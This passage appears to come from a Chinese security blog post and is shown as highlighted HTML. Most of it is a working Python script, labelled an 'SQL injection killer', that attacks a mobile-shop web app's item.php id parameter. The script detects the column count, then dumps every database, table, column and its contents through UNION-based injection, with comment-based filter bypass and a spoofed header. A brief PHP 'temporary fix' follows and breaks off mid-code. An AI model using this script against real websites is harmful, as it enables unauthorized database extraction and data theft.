string">'#'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">' '</span><span class="token punctuation">,</span><span class="token string">''</span><span class="token punctuation">)</span>    req1 <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token operator">=</span>exp<span class="token punctuation">,</span>headers<span class="token operator">=</span>header<span class="token punctuation">)</span><span class="token punctuation">.</span>text    Injection <span class="token operator">=</span> re<span class="token punctuation">.</span>findall<span class="token punctuation">(</span>r<span class="token string">'&lt;title>(.*)[\s]-'</span><span class="token punctuation">,</span>req1<span class="token punctuation">)</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>Injection<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token keyword">in</span> <span class="token punctuation">(</span>str<span class="token punctuation">(</span>new_length<span class="token punctuation">)</span><span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token string">'[]'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        exp <span class="token operator">=</span> url<span class="token operator">+</span>page2<span class="token operator">+</span>payload<span class="token operator">+</span>str<span class="token punctuation">(</span>new_length<span class="token punctuation">)</span><span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token string">'[]'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span>Injection<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span>columns<span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">'/**/from/**/'</span><span class="token operator">+</span>new_DB<span class="token operator">+</span><span class="token string">'.'</span><span class="token operator">+</span>new_TABLE<span class="token operator">+</span><span class="token string">'#'</span>        exp <span class="token operator">=</span> exp<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">' '</span><span class="token punctuation">,</span><span class="token string">''</span><span class="token punctuation">)</span>        req <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token operator">=</span>exp<span class="token punctuation">,</span>headers<span class="token operator">=</span>header<span class="token punctuation">)</span><span class="token punctuation">.</span>text        columns_content <span class="token operator">=</span> re<span class="token punctuation">.</span>findall<span class="token punctuation">(</span>r<span class="token string">'&lt;title>(.*)[\s]-'</span><span class="token punctuation">,</span>req<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>        <span class="token keyword">print</span> <span class="token string">'====================正在判获取{}的字段内容，请稍候==============================\n'</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>columns<span class="token punctuation">)</span>        <span class="token keyword">print</span> <span class="token string">'列{}的数据为：{}'</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>columns<span class="token punctuation">,</span>str<span class="token punctuation">(</span>columns_content<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">get_table_columns</span><span class="token punctuation">(</span>table<span class="token punctuation">,</span>new_DB<span class="token punctuation">)</span><span class="token punctuation">:</span>    new_TABLE <span class="token operator">=</span> table    new_DB <span class="token operator">=</span> new_DB    num <span class="token operator">=</span> <span class="token string">''</span>    new_length <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">15</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        exp <span class="token operator">=</span> url<span class="token operator">+</span>page1<span class="token operator">+</span><span class="token punctuation">(</span><span class="token string">' order by '</span> <span class="token operator">+</span> str<span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">'#'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">' '</span><span class="token punctuation">,</span><span class="token string">'/**/'</span><span class="token punctuation">)</span>        req <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token operator">=</span>exp<span class="token punctuation">,</span> headers<span class="token operator">=</span>header<span class="token punctuation">)</span><span class="token punctuation">.</span>text        <span class="token keyword">if</span> len<span class="token punctuation">(</span>req<span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">300</span><span class="token punctuation">:</span>            length <span class="token operator">=</span> i            num <span class="token operator">=</span> length            <span class="token keyword">break</span>    <span class="token keyword">for</span> j <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> num<span class="token punctuation">)</span><span class="token punctuation">:</span>        new_length<span class="token punctuation">.</span>append<span class="token punctuation">(</span>j<span class="token punctuation">)</span>    exp <span class="token operator">=</span> <span class="token punctuation">(</span>url<span class="token operator">+</span>page2<span class="token operator">+</span>payload <span class="token operator">+</span> str<span class="token punctuation">(</span>new_length<span class="token punctuation">)</span><span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token string">'[]'</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">'#'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">' '</span><span class="token punctuation">,</span><span class="token string">''</span><span class="token punctuation">)</span>    req1 <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token operator">=</span>exp<span class="token punctuation">,</span>headers<span class="token operator">=</span>header<span class="token punctuation">)</span><span class="token punctuation">.</span>text    Injection <span class="token operator">=</span> re<span class="token punctuation">.</span>findall<span class="token punctuation">(</span>r<span class="token string">'&lt;title>(.*)[\s]-'</span><span class="token punctuation">,</span>req1<span class="token punctuation">)</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>Injection<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token keyword">in</span> <span class="token punctuation">(</span>str<span class="token punctuation">(</span>new_length<span class="token punctuation">)</span><span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token string">'[]'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        exp <span class="token operator">=</span> url<span class="token operator">+</span>page2<span class="token operator">+</span>payload<span class="token operator">+</span>str<span class="token punctuation">(</span>new_length<span class="token punctuation">)</span><span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token string">'[]'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span>Injection<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token string">'group_concat(column_name)'</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token punctuation">(</span><span class="token string">' from information_schema.columns where table_name={}'</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>code_to_hex<span class="token punctuation">(</span>table<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">' '</span><span class="token punctuation">,</span><span class="token string">'/**/'</span><span class="token punctuation">)</span>        exp <span class="token operator">=</span> exp<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">' '</span><span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">)</span>        req <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token operator">=</span>exp<span class="token punctuation">,</span> headers<span class="token operator">=</span>header<span class="token punctuation">)</span><span class="token punctuation">.</span>text        table_columns <span class="token operator">=</span> re<span class="token punctuation">.</span>findall<span class="token punctuation">(</span>r<span class="token string">'&lt;title>(.*)[\s]-'</span><span class="token punctuation">,</span> req<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>        <span class="token keyword">print</span> <span class="token string">'=====================正在判获取{}的所有列，请稍候===============================\n'</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>table<span class="token punctuation">)</span>        <span class="token keyword">print</span> <span class="token string">'表{}所有的数据列为：{}\n'</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>table<span class="token punctuation">,</span>str<span class="token punctuation">(</span>table_columns<span class="token punctuation">)</span><span class="token punctuation">)</span>        get_columns_content<span class="token punctuation">(</span>raw_input<span class="token punctuation">(</span><span class="token string">'请输入要爆的列名：'</span><span class="token punctuation">)</span><span class="token punctuation">,</span>new_DB<span class="token punctuation">,</span>new_TABLE<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">get_DB_tables</span><span class="token punctuation">(</span>database<span class="token punctuation">)</span><span class="token punctuation">:</span>    new_DB <span class="token operator">=</span> database    num <span class="token operator">=</span> <span class="token string">''</span>    new_length <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">25</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        exp <span class="token operator">=</span> url<span class="token operator">+</span>page1<span class="token operator">+</span><span class="token punctuation">(</span><span class="token string">' order by '</span> <span class="token operator">+</span> str<span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">'#'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">' '</span><span class="token punctuation">,</span><span class="token string">'/**/'</span><span class="token punctuation">)</span>        req <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token operator">=</span>exp<span class="token punctuation">,</span> headers<span class="token operator">=</span>header<span class="token punctuation">)</span><span class="token punctuation">.</span>text        <span class="token keyword">if</span> len<span class="token punctuation">(</span>req<span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">300</span><span class="token punctuation">:</span>            length <span class="token operator">=</span> i            num <span class="token operator">=</span> length            <span class="token keyword">break</span>    <span class="token keyword">for</span> j <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> num<span class="token punctuation">)</span><span class="token punctuation">:</span>        new_length<span class="token punctuation">.</span>append<span class="token punctuation">(</span>j<span class="token punctuation">)</span>    exp <span class="token operator">=</span> <span class="token punctuation">(</span>url<span class="token operator">+</span>page2<span class="token operator">+</span>payload <span class="token operator">+</span> str<span class="token punctuation">(</span>new_length<span class="token punctuation">)</span><span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token string">'[]'</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">'#'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">' '</span><span class="token punctuation">,</span><span class="token string">''</span><span class="token punctuation">)</span>    req1 <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token operator">=</span>exp<span class="token punctuation">,</span>headers<span class="token operator">=</span>header<span class="token punctuation">)</span><span class="token punctuation">.</span>text    Injection <span class="token operator">=</span> re<span class="token punctuation">.</span>findall<span class="token punctuation">(</span>r<span class="token string">'&lt;title>(.*)[\s]-'</span><span class="token punctuation">,</span>req1<span class="token punctuation">)</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>Injection<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token keyword">in</span> <span class="token punctuation">(</span>str<span class="token punctuation">(</span>new_length<span class="token punctuation">)</span><span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token string">'[]'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        exp <span class="token operator">=</span> url<span class="token operator">+</span>page2<span class="token operator">+</span>payload<span class="token operator">+</span>str<span class="token punctuation">(</span>new_length<span class="token punctuation">)</span><span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token string">'[]'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span>Injection<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token string">'group_concat(table_name)'</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token punctuation">(</span><span class="token string">' from information_schema.tables where table_schema={}'</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>code_to_hex<span class="token punctuation">(</span>database<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">' '</span><span class="token punctuation">,</span><span class="token string">'/**/'</span><span class="token punctuation">)</span>        exp <span class="token operator">=</span> exp<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">' '</span><span class="token punctuation">,</span><span class="token string">''</span><span class="token punctuation">)</span>        req <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token operator">=</span>exp<span class="token punctuation">,</span>headers<span class="token operator">=</span>header<span class="token punctuation">)</span><span class="token punctuation">.</span>text        db_tables <span class="token operator">=</span> re<span class="token punctuation">.</span>findall<span class="token punctuation">(</span>r<span class="token string">'&lt;title>(.*)[\s]-'</span><span class="token punctuation">,</span>req<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>        <span class="token keyword">print</span> <span class="token string">'=====================正在判获取{}的所有表，请稍候===============================\n'</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>database<span class="token punctuation">)</span>        <span class="token keyword">print</span> <span class="token string">'数据库{}所有的数据表为：{}\n'</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>database<span class="token punctuation">,</span>str<span class="token punctuation">(</span>db_tables<span class="token punctuation">)</span><span class="token punctuation">)</span>        get_table_columns<span class="token punctuation">(</span>raw_input<span class="token punctuation">(</span><span class="token string">'请输入要爆的表名：'</span><span class="token punctuation">)</span><span class="token punctuation">,</span>new_DB<span class="token punctuation">)</span>        <span class="token keyword">return</span> new_DB<span class="token keyword">def</span> <span class="token function">get_all_database</span><span class="token punctuation">(</span>length<span class="token punctuation">)</span><span class="token punctuation">:</span>    new_length <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>    <span class="token keyword">for</span> j <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span>length<span class="token punctuation">)</span><span class="token punctuation">:</span>        new_length<span class="token punctuation">.</span>append<span class="token punctuation">(</span>j<span class="token punctuation">)</span>    exp <span class="token operator">=</span> payload<span class="token operator">+</span>str<span class="token punctuation">(</span>new_length<span class="token punctuation">)</span><span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token string">'[]'</span><span class="token punctuation">)</span>    exp <span class="token operator">=</span> <span class="token punctuation">(</span>url<span class="token operator">+</span>page2<span class="token operator">+</span>exp<span class="token operator">+</span><span class="token string">'#'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">' '</span><span class="token punctuation">,</span><span class="token string">''</span><span class="token punctuation">)</span>    req <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token operator">=</span>exp<span class="token punctuation">,</span>headers<span class="token operator">=</span>header<span class="token punctuation">)</span><span class="token punctuation">.</span>text    Injection <span class="token operator">=</span> re<span class="token punctuation">.</span>findall<span class="token punctuation">(</span>r<span class="token string">'&lt;title>(.*)[\s]-'</span><span class="token punctuation">,</span>req<span class="token punctuation">)</span>    <span class="token keyword">print</span> <span class="token string">'====================正在当前页面注入点，请稍候==============================\n'</span>    <span class="token keyword">print</span> <span class="token string">'当前页面注入点为：{}\n'</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>str<span class="token punctuation">(</span>Injection<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">print</span> <span class="token string">'=====================正在判获取数据库，请稍候===============================\n'</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>Injection<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token keyword">in</span> <span class="token punctuation">(</span>str<span class="token punctuation">(</span>new_length<span class="token punctuation">)</span><span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token string">'[]'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        exp <span class="token operator">=</span> url<span class="token operator">+</span>page2<span class="token operator">+</span>payload<span class="token operator">+</span>str<span class="token punctuation">(</span>new_length<span class="token punctuation">)</span><span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token string">'[]'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span>Injection<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token string">'group_concat(schema_name)'</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">' from information_schema.schemata#'</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">' '</span><span class="token punctuation">,</span><span class="token string">'/**/'</span><span class="token punctuation">)</span>        exp <span class="token operator">=</span> exp<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">' '</span><span class="token punctuation">,</span><span class="token string">''</span><span class="token punctuation">)</span>        req2 <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token operator">=</span>exp<span class="token punctuation">,</span>headers<span class="token operator">=</span>header<span class="token punctuation">)</span><span class="token punctuation">.</span>text        all_db_name <span class="token operator">=</span> re<span class="token punctuation">.</span>findall<span class="token punctuation">(</span>r<span class="token string">'&lt;title>(.*)[\s]-'</span><span class="token punctuation">,</span>req2<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>        <span class="token keyword">print</span> <span class="token string">'当前网站所有数据库为：{}\n'</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>str<span class="token punctuation">(</span>all_db_name<span class="token punctuation">)</span><span class="token punctuation">)</span>        get_DB_tables<span class="token punctuation">(</span>raw_input<span class="token punctuation">(</span><span class="token string">'请输入要查的库：'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">get_length</span><span class="token punctuation">(</span>url<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">25</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        exp <span class="token operator">=</span> <span class="token string">' order by '</span> <span class="token operator">+</span> str<span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">'#'</span>        exp <span class="token operator">=</span> exp<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">' '</span><span class="token punctuation">,</span><span class="token string">'/**/'</span><span class="token punctuation">)</span>        req <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token operator">=</span>url<span class="token operator">+</span>page1<span class="token operator">+</span>exp<span class="token punctuation">,</span> headers<span class="token operator">=</span>header<span class="token punctuation">)</span><span class="token punctuation">.</span>text        <span class="token keyword">if</span> len<span class="token punctuation">(</span>req<span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">300</span> <span class="token punctuation">:</span>            length <span class="token operator">=</span> i            <span class="token keyword">print</span> <span class="token string">'=====================正在判断字段长度，请稍候===============================\n'</span>            <span class="token keyword">print</span> <span class="token string">'当前字段长度为：%d\n'</span><span class="token operator">%</span><span class="token punctuation">(</span>length<span class="token number">-1</span><span class="token punctuation">)</span>            get_all_database<span class="token punctuation">(</span>length<span class="token punctuation">)</span>            <span class="token keyword">return</span> length<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    <span class="token keyword">print</span> <span class="token triple-quoted-string string">'''     ========================================================    |                金微手机商城SQL注入杀手                  |    |                    By: 1匹黑马                         |    |         Blog：https://blog.csdn.net/qq_43573676        |     ========================================================    '''</span>    url <span class="token operator">=</span> raw_input<span class="token punctuation">(</span><span class="token string">'请输入目标网址（eg：http://1.1.1.137:8003）：'</span><span class="token punctuation">)</span>    page1 <span class="token operator">=</span> <span class="token string">'/item.php?id=1'</span>    page2 <span class="token operator">=</span> <span class="token string">'/item.php?id=-1'</span>    header <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">'X-Forwarded-For'</span><span class="token punctuation">:</span> <span class="token string">'127.0.0.1'</span><span class="token punctuation">,</span> <span class="token string">'content-type'</span><span class="token punctuation">:</span> <span class="token string">'application/json'</span><span class="token punctuation">}</span>    payload <span class="token operator">=</span> <span class="token string">'/**/union/**/select/**/'</span>    new_DB <span class="token operator">=</span> <span class="token string">''</span>    new_TABLE <span class="token operator">=</span> <span class="token string">''</span>    get_length<span class="token punctuation">(</span>url<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>看一下运行效果：<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20210129171806131.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTczNjc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h3 id="临时修复"><a href="#临时修复" class="headerlink" title="临时修复"></a>临时修复</h3><p>临时修复采用addslashes()过滤特殊符号，随后接着用preg_mach()进行正则匹配，只匹配数字</p><p>部分关键代码：</p><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token comment" spellcheck="true">//====== 商品详情 ======</span><span class="token keyword">require</span> <span class="token string">"common.php"</span><span class="token punctuation">;</span><span class="token shell-comment comment">####################################################</span><span class="token shell-comment comment"># addslashes()过滤特殊符号                           #</span><span class="token shell-comment comment"># 然后进行正则替换，重新赋值给$n                        #</span><span class="token variable">$n</span><span class="token operator">=</span><span class="token function">addslashes</span><span class="token punctuation">(</span><span class="token function">Req</span><span class="token punctuation">(</span><span class="token string">"id"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                      <span class="token shell-comment comment">#</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">"/\d+/i"</span><span class="token punctuation">,</span><span class="token variable">$n</span><span class="token punctuation">,</span><span class="token variable">$new_id</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token shell-comment comment">#</span><span class="token variable">$n</span> <span class="token operator">=</span> <span class="token variable">$new_id</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span>                                 <span class="token shell-comment comment">#</span><span class="token shell-comment comment">#################################################</span><span class="token variable">$r</span><span class="token operator">=</span><span class="token function">Qra</span><span class="token punctuation">(</span><span class="token function">Qry</span><span class="token punctuation">(</span><span class="token string">"Select ID,Nm,Nc,Np,Ni,Nb,Nx,Nk,Ns,Nr,Nw,Nf From "</span><span class="token punctuation">.</span><span class="token variable">$pre</span><span class="token punctuation">.</span><span class="token string">"goods Where Nh=0 And ID="</span><span class="token punctuation">.</span><span class="token variable">$n</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$r</span><span class="token punctuation">)</span><span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"&lt;script>alert('商品不存在或已下架！');window.location='main.php';&lt;/script>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$r</span><span class="token punctuation">[</span><span class="token string">"Ni"</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token function">Dec</span><span class="token punctuation">(</span><span class="token variable">$r</span><span class="token punctuation">[</span><span class="token string">"Ni"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$r</span><span class="token punctuation">[</span><span class="token string">"Nb"</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token function">Dec</span><span class="token punctuation">(</span><span class="token variable">$r</span><span class="token punctuation">[</span><span class="token string">"Nb"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$r</span><span class="token punctuation">[</span><span class="token string">"Nx"</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token variable">$r</span><span class="token punctuation">[</span><span class="token string">"Nf"</span><span class="token punctuation">]</span><span class="token operator">*</span><span class="token number">1</span><span class="token operator">==</span><span class="token number">0</span><span class="token operator">?</span><span class="token string">'{}'</span><span class="token punctuation">:</span><span class="token function">Dec</span><span class="token punctuation">(</span><span class="token variable">$r</span><span class="token punctuation">[</span><span class="token string">"Nx"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$e</span><span class="token operator">=</span><span class="token function">Qra</span><span class="token punctuation">(</span><span class="token function">Qry</span><span class="token punctuation">(</span><span class="token string">"Select Np From "</span><span class="token punctuation">.</span><span class="token variable">$pre</span><span class="token punctuation">.</span><span class="token string">"exfee Where ID="</span><span class="token punctuation">.</span><span class="token variable">$r</span><span class="token punctuation">[</span><span class="token string">"Nf"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$k</span><span class="token operator">=</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$q</span><span class="token operator">=</span><span class="token function">Qry</span><span class="token punctuation">(</span><span class="token string">"Select ID,Nn,Nm,Nk,Nc,Ns,Ne,Ng From "</span><span class="token punctuation">.</span><span class="token variable">$pre</span><span class="token punctuation">.</span><span class="token string">"coupon Order By Nm Desc"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">while</span><span class="token punctuation">(</span><span class="token variable">$b</span><span class="token operator">=</span><span class="token function">Qra</span><span class="token punctuation">(</span><span class="token variable">$q</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token variable">$k</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token variable">$b</span><span class="token punctuation">;</span><span class="token variable">$c</span><span class="token operator">=</span><span class="token function">Qrs</span><span class="token punctuation">(</span><span class="token function">Qry</span><span class="token punctuation">(</span><span class="token string">"Select Count(ID) As Rc From "</span><span class="token punctuation">.</span><span class="token variable">$pre</span><span class="token punctuation">.</span><span class="token string">"review Where Ni="</span><span class="token punctuation">.</span><span class="token variable">$n</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$v</span><span class="token operator">=</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$c</span><span class="token operator">></span><span class="token number">0</span><span class="token punctuation">)</span><span class="token variable">$v</span><span class="token operator">=</span><span class="token function">Qra</span><span class="token punctuation">(</span><span class="token function">Qry</span><span class="token punctuation">(</span><span class="token string">"Select Nc,Np,Nu,Nx From "</span><span class="token punctuation">.</span><span class="token variable">$pre</span><span class="token punctuation">.</span><span class="token string">"review Where Ni="</span><span class="token punctuation">.</span><span class="token variable">$n</span><span class="token punctuation">.</span><span class="token string">" Order By Nd Desc Limit 0,1"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$v</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$v</span><span class="token punctuation">[</span><span class="token string">"Nu"</span><span class="token punctuation">]</span><span class="token operator">*</span><span class="token number">1</span><span class="token operator">></span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token variable">$f</span><span class="token operator">=</span><span class="token function">Qra</span><span class="token punctuation">(</span><span class="token function">Qry</span><span class="token punctuation">(</span><span class="token string">"Select Nm From "</span><span class="token punctuation">.</span><span class="token variable">$pre</span><span class="token punctuation">.</span><span class="token string">"user Where ID="</span><span class="token punctuation">.</span><span class="token variable">$v</span><span class="token punctuation">[</span><span class="token string">"Nu"</span><span class="token punctuation">]</span><span class="token 